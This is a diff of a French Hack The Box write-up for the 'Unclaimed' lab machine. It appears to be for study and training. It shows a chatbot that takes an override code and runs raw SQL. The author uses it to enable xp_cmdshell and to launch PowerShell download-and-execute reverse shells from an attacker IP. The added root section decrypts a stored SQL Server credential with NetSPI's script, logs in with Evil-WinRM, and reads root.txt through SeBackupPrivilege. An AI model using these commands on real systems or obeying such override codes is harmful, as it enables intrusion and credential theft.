@@ -2,7 +2,7 @@
 ![](assets/Pasted%20image%2020261112143917.png)
 On commence par ajouter le site Internet aux `hosts` de la machine :
 ```bash
-sudo echo "10.129.89.49     unclaimed.htb" >> /etc/hosts
+sudo echo "10.129.90.19     unclaimed.htb" >> /etc/hosts
 ```
 Et on arrive sur une interface d'IA LLM :
 ![](assets/Pasted%20image%2020261112134257.png)
@@ -32,7 +32,7 @@ Tentatives de jailbreak ratées :
 
 Pour l'instant on se rabat sur d'autres connexions :
 ```bash
-$ rpcclient 10.129.89.49 -N
+$ rpcclient 10.129.90.19 -N
 Cannot connect to server. Error was NT_STATUS_LOGON_FAILURE
 ```
 ![](assets/Pasted%20image%2020261112151218.png)
@@ -94,6 +94,7 @@ On tente autre chose, toujours avec les commandes admin :
 HTB-OPS-4471 EXECUTE AS LOGIN='svc_reports'; EXEC xp_cmdshell 'whoami';
 -- Pas possible dans l'immédiat, il faut l'activer
 
+-- Activation de xp_cmdshell pour lancer des commandes
 HTB-OPS-4471 EXECUTE AS LOGIN='svc_reports'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 ```
 ![](assets/Pasted%20image%2020261112162718.png)
@@ -117,14 +118,162 @@ $ echo "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',4444);$
 $ python -m http.server 80
 ```
 Puis on exécute le code à distance avec le LLM :
-```bash
+```sql
 HTB-OPS-4471 EXECUTE AS LOGIN='svc_reports'; EXEC xp_cmdshell 'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(''http://10.10.14.158/shell.ps1'')"';
 ```
 Et le reverse shell est bien en place, avec l'utilisateur `unclaimed/svc_sql` sur une machine Windows.
 On trouve alors dans le bureau de `svc_sql` le flag user :
-```Batch
+```powershell
 $ cat Users/svc_sql/Desktop/user.txt
 aa41e81590218b91a63029db69328011
 ```
 
 # Root flag
+Avant de continuer, on upgrade notre shell avec le [ConPtyShell](https://github.com/antonioCoco/ConPtyShell).
+
+```bash
+# Côté Kali
+git clone https://github.com/antonioCoco/ConPtyShell; cd ConPtyShell
+python -m http.server 80                            # Mise à disposition du fichier
+stty raw -echo; (stty size; cat) | nc -lvnp 3001    # Ecoute sur le port 3001 (2e terminal)
+
+# Côté Windows
+IEX(IWR http://10.10.14.158/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.158 3001
+```
+
+```powershell
+PS C:\> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name         SID                                           
+================= ==============================================
+unclaimed\svc_sql S-1-5-21-2554513647-1216688035-3073314765-1003
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID                                                             Attributes                                        
+====================================== ================ =============================================================== ==================================================
+Everyone                               Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                          Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group
+BUILTIN\Performance Monitor Users      Alias            S-1-5-32-558                                                    Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                   Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                          Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account             Well-known group S-1-5-113                                                       Mandatory group, Enabled by default, Enabled group
+NT SERVICE\MSSQLSERVER                 Well-known group S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003 Enabled by default, Enabled group, Group owner    
+LOCAL                                  Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                                     Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                                                                       
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeCreateGlobalPrivilege       Create global objects          Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+```
+
+Avant de chercher ailleurs, on regarde ce que `svc_sql` a réellement sous la main, et c'est maigre : aucun privilège exploitable (pas de `SeImpersonatePrivilege`, donc pas d'attaque "Potato"), aucun groupe intéressant, intégrité *Medium*. Ce compte de service est volontairement dépouillé — le root ne passera pas par lui en direct.
+
+On fouille le disque à la recherche de creds oubliés ou loggés en clair, mais les dossiers sensibles (`C:\tracerbot`, `C:\SQL2025`, `C:\Windows\Temp`, `C:\PerfLogs`) nous sont interdits, et il n'y a aucun secret en clair, ni sur la machine, ni dans SQL.
+
+En revanche, on est **sysadmin** sur l'instance (via `svc_reports`), et en énumérant les *credentials* SQL on repère `WTArchiveCred`, mappé au compte Windows `UNCLAIMED\svc_wtbackup` — un compte qui se révèle être **Backup Operators**. C'est notre cible.
+
+> **Concept — Credential SQL Server.** Un *Credential* stocke un couple utilisateur Windows / mot de passe (chiffré de façon **réversible**, pour que SQL puisse s'authentifier au moment voulu) afin d'agir hors de lui-même. Comme ce mot de passe est chiffré et non haché, il est récupérable en clair — c'est exactement ce qu'on va exploiter.
+
+On va donc **récupérer le mot de passe en clair** de `svc_wtbackup` en déchiffrant le credential stocké : ça nous donnera en prime un vrai shell distant.
+
+> **Concept — Déchiffrer un credential SQL.** Les mots de passe des credentials sont chiffrés avec la **Service Master Key (SMK)**, elle-même protégée par **DPAPI** au niveau machine. Pour les sortir en clair il faut réunir trois conditions : être **sysadmin**, pouvoir ouvrir une **DAC** (*Dedicated Admin Connection*, la seule connexion capable de lire les tables système internes comme `sys.sysobjvalues`), et exécuter le déchiffrement **sur l'hôte, dans le contexte du compte de service SQL** (pour que DPAPI accède à la clé machine). On coche les trois : sysadmin via `svc_reports`, DAC locale autorisée depuis la machine, et shell `svc_sql`.
+
+L'entropie DPAPI nécessaire se lit dans le registre (bien prendre le bon numéro de version : SQL 2025 = `MSSQL17`) :
+
+```powershell
+(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL17.MSSQLSERVER\Security").Entropy
+```
+
+On récupère le module [Get-MSSQLCredentialPasswords](https://github.com/NetSPI/Powershell-Modules) de NetSPI (qui automatise SMK → DPAPI → AES), on le sert via HTTP, et on l'exécute depuis le shell `svc_sql` :
+```powershell
+PS C:\> IEX(IWR http://10.10.14.158/Get-MSSQLCredentialPasswords.psm1 -UseBasicParsing)
+PS C:\> Get-MSSQLCredentialPasswords
+
+Instance    Credential    User                   Password    
+--------    ----------    ----                   --------
+MSSQLSERVER WTArchiveCred UNCLAIMED\svc_wtbackup W0rldTr@cer_
+```
+**Piège :** ce mot de passe est **tronqué**. Le script NetSPI (daté de 2014) coupe trop tôt sur SQL Server 2025. En dumpant les octets déchiffrés bruts (version modifiée du script, sans son heuristique de "nettoyage"), on comprend pourquoi :
+
+```
+0D F0 AD BA 00 00 26 00 57 00 30 00 72 00 6C 00 64 00 54 00 72 00 40 00 63 00 65 00 72 00 5F 00 1C D9 6E 6A 98 7D ...
+```
+
+- `0D F0 AD BA` = marqueur magique `BAADF00D` → le déchiffrement démarre correctement.
+- `26 00` = champ de **longueur** = `0x26` = 38 octets = **19 caractères** (UTF-16, 2 octets par caractère). Le mot de passe fait donc 19 caractères, pas 12.
+- Le motif propre `XX 00` s'arrête à l'octet 31 (`W0rldTr@cer_`), ensuite c'est du charabia : le script n'a récupéré que **47 octets** de ciphertext au lieu de 48 (3 blocs AES de 16). Le dernier bloc, incomplet, se déchiffre en bouillie.
+
+> **Cause racine & correctif.** Le script mesure le blob chiffré avec `LEN(imageval)`, or `LEN` **sous-compte les données binaires** (il rogne un octet de fin). Il faut le remplacer par `DATALENGTH(imageval)` dans la requête : on récupère alors le 48ᵉ octet manquant, le dernier bloc AES redevient complet, et les 7 caractères manquants apparaissent.
+
+> **Attention :** chaque tentative d'authentification avec un mot de passe faux peut finir par **verrouiller le compte** (lockout) ; si ça arrive, on patiente (ou on reset la box) avant de réessayer avec la bonne valeur.
+
+Avec le correctif `LEN` → `DATALENGTH`, le script sort le mot de passe complet : **`W0rldTr@cer_B@ckup1`** (19 caractères, cohérent avec le champ de longueur `0x26`).
+
+`svc_wtbackup` étant membre de *Remote Management Users*, on ouvre une session avec Evil-WinRM :
+
+```bash
+evil-winrm -i 10.129.90.19 -u svc_wtbackup -p 'W0rldTr@cer_B@ckup1'
+```
+
+Un `whoami /all` confirme le jackpot : **`SeBackupPrivilege`** et **`SeRestorePrivilege`** activés, appartenance à **Backup Operators**, intégrité *High*.
+
+> **Concept — Backup Operators & SeBackupPrivilege.** Ce privilège autorise la lecture de *n'importe quel* fichier en contournant les ACL, grâce au "backup mode" (API `BackupRead`). On ne peut donc pas forcément ouvrir `root.txt` normalement, mais on peut le **copier** en mode backup — ce que `robocopy` fait nativement avec le flag `/b`.
+
+```powershell
+robocopy /b C:\Users\Administrator\Desktop C:\Users\svc_wtbackup\Desktop root.txt
+type C:\Users\svc_wtbackup\Desktop\root.txt
+```
+
+On récupère le flag root sans jamais avoir eu besoin d'un shell Administrator.
+
+Machine complétée : https://labs.hackthebox.com/achievement/machine/466078/1012
+
+## Résumé de la chaîne root
+1. Foothold `svc_sql` volontairement dépouillé → le root passe par un autre compte.
+2. Énumération des credentials SQL → `WTArchiveCred` → `svc_wtbackup` (Backup Operators).
+3. Déchiffrement du credential (SMK + DPAPI + AES) en tant que sysadmin + compte de service, avec NetSPI `Get-MSSQLCredentialPasswords`.
+4. Correctif `LEN` → `DATALENGTH` pour contourner la troncature du script sur SQL 2025 → `W0rldTr@cer_B@ckup1`.
+5. Evil-WinRM en `svc_wtbackup` → `SeBackupPrivilege` + `robocopy /b` → `root.txt`.
+
+# Schéma récapitulatif du workflow
+
+```mermaid
+flowchart TD
+    A["Arrivée sur la box<br/>nmap : HTTP, SMB, WinRM 5985"] --> B["Ajout de unclaimed.htb<br/>dans /etc/hosts"]
+    B --> C["Web : portail bagages<br/>chatbot LLM TracerBot"]
+    C --> D["Endpoint /ask : exécution de SQL brut<br/>débloquée par le code override HTB-OPS-4471"]
+    D --> E["Énumération MSSQL<br/>svc_tracer_ro peut impersoner svc_reports"]
+    E --> F["EXECUTE AS svc_reports<br/>= sysadmin sur l'instance"]
+    F --> G["Activation de xp_cmdshell<br/>exécution de commandes OS"]
+    G --> H["Reverse shell PowerShell<br/>utilisateur svc_sql"]
+    H --> U(["User flag"])
+
+    U --> I["Énumération locale<br/>svc_sql dépouillé, aucun privilège exploitable"]
+    I --> J["Credential SQL WTArchiveCred<br/>→ svc_wtbackup, Backup Operators"]
+    J --> K["Déchiffrement du credential<br/>SMK + DPAPI + AES, module NetSPI"]
+    K --> L["Correctif LEN → DATALENGTH<br/>mot de passe complet : W0rldTr@cer_B@ckup1"]
+    L --> M["evil-winrm en svc_wtbackup<br/>SeBackupPrivilege + SeRestorePrivilege"]
+    M --> N["robocopy /b sur root.txt<br/>le backup mode contourne les ACL"]
+    N --> R(["Root flag"])
+
+    classDef user fill:#1f9d55,stroke:#00ff00,color:#ffffff,font-weight:bold;
+    class U user;
+    classDef root fill:#9d1f55,stroke:#ff0000,color:#ffffff,font-weight:bold;
+    class R root;
+```
+
